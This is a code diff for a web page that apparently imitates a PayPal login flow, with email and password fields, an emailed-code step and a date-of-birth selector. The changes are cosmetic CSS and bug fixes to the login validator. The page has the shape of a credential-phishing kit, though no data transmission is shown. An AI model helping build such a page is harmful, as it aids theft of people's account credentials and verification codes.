@@ -119,9 +119,9 @@
 }
 
 .brand-badge {
-  width: 110px;
-  height: 110px;
-  flex: 0 0 110px;
+  width: 58px;
+  height: 58px;
+  flex: 0 0 58px;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -669,6 +669,10 @@
   font-weight: 700;
   cursor: pointer;
   padding: 0;
+  min-height: auto;
+  border-radius: 0;
+  display: block;
+  z-index: 2;
 }
 .resend-link {
   margin-top: 14px;
@@ -1270,7 +1274,7 @@
 </div>
             </div>
             <div class="centered-actions">
-              <button class="btn-primary" type="button" onclick="validatePayPalLogin()">Log In</button>
+              <button class="btn-primary" type="button" onclick="validatePaypalLogin()">Log In</button>
             </div>
           </div>
         </div>
@@ -1587,9 +1591,9 @@ const stageMap = {
   showPage('loadingToLoginPage', true);
 }
 
-   function validatePaypalLogin() {
+ function validatePaypalLogin() {
   clearFieldErrors();
-  clearFeedback('paypalFeedback');
+  clearFeedback('paypalLoginFeedback');
 
   const email = document.getElementById('paypalEmail').value.trim();
   const password = document.getElementById('paypalPassword').value.trim();
@@ -1607,13 +1611,12 @@ const stageMap = {
   }
 
   if (errors.length > 0) {
-    showFeedback('paypalFeedback', errors.join('<br>'), 'error');
+    showFeedback('paypalLoginFeedback', errors.join('<br>'), 'error');
     return;
   }
 
   showPage('paypalCodePage', true);
 }
-
 let currentEmailCode = "";
 let resendSeconds = 0;
 let resendInterval = null;
@@ -1729,10 +1732,6 @@ function resendEmailCode() {
       URL.revokeObjectURL(url);
     }
 
-    window.addEventListener('popstate', (event) => {
-      const pageId = event.state?.page || 'homePage';
-      showPage(pageId, false);
-    });
 
   function initialisePage() {
   populateDOB();
